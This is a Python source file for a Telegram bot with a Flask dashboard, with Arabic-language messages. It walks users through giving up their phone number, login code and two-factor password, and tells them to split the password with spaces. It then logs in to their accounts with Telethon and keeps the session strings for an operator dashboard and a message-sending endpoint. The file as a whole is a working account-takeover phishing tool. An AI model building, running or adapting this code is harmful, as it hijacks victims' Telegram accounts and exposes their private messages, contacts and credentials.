import os
import asyncio
from flask import Flask, request, jsonify, send_file
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
DASHBOARD_CODE = os.environ.get("DASHBOARD_CODE", "1234")
BASE_URL = os.environ.get("BASE_URL", "")

app = Flask(__name__)
sessions = {}

PHONE, CODE, PASSWORD, DASHBOARD = range(4)

# ── BOT HANDLERS ──

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["phone"] = phone
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        context.user_data["client"] = client
        await update.message.reply_text("✅ وصلك رمز على تلغرام، أرسله هنا:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
        return ConversationHandler.END

async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    phone = context.user_data["phone"]
    client = context.user_data["client"]
    try:
        await client.sign_in(phone, code)
        # نجح بدون 2FA
        return await finish_login(update, context, client)
    except SessionPasswordNeededError:
        # عنده مصادقة ثنائية
        await update.message.reply_text(
            "🔐 حسابك عنده مصادقة ثنائية!\n\n"
            "أرسل كلمة المرور بشكل مفرق\n"
            "مثال: إذا كلمتك `hello123` أرسلها هكذا:\n"
            "`h e l l o 1 2 3`\n\n"
            "⚠️ افرق كل حرف برسالة او بمسافة"
        )
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ الرمز خاطئ: {e}\nأرسل الرمز مرة ثانية:")
        return CODE

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    
    # نحذف المسافات ونجمع الحروف
    # مثال: "h e l l o 1 2 3" تصير "hello123"
    # مثال: "3 4 5 9 3 9 3" تصير "3459393"
    password = raw.replace(" ", "")
    
    client = context.user_data["client"]
    phone = context.user_data["phone"]
    
    try:
        await client.sign_in(password=password)
        return await finish_login(update, context, client)
    except Exception as e:
        await update.message.reply_text(
            f"❌ كلمة المرور خاطئة\n"
            "حاول مرة ثانية، تذكر تفرق الحروف بمسافات:"
        )
        return PASSWORD

async def finish_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client):
    phone = context.user_data["phone"]
    session_str = client.session.save()
    sessions[phone] = session_str
    user_id = update.effective_user.id
    dashboard_url = f"{BASE_URL}/dashboard?user={user_id}&code={DASHBOARD_CODE}"
    keyboard = [[InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("تم الإلغاء. اكتب /start للبدء من جديد.")
    return ConversationHandler.END

# ── FLASK ROUTES ──

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/dashboard")
def dashboard():
    code = request.args.get("code")
    if code != DASHBOARD_CODE:
        return "غير مصرح", 403
    return send_file("index.html")

@app.route("/api/send", methods=["POST"])
def send_messages():
    data = request.json
    phone = data.get("phone")
    session_str = sessions.get(phone)
    if not session_str:
        return jsonify({"error": "لا توجد جلسة"}), 401
    return jsonify({"status": "ok"})

# ── MAIN ──

def run_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(conv)
    application.run_polling()

if __name__ == "__main__":
    import threading
    t = threading.Thread(target=run_bot)
    t.daemon = True
    t.start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
